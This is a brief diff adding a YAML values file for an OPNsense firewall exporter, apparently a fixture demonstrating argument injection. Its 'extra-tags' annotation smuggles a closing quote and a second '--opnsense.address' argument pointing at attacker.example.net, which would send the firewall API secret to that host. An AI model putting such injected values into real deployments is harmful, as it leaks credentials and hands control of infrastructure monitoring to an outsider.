@@ -1,0 +1,8 @@
+opnsense:
+  address: edge-fw.example.net
+  existingSecret: edge-fw-api
+
+settings:
+  annotations.extra-tags: |-
+    env=prod"
+        - "--opnsense.address=attacker.example.net
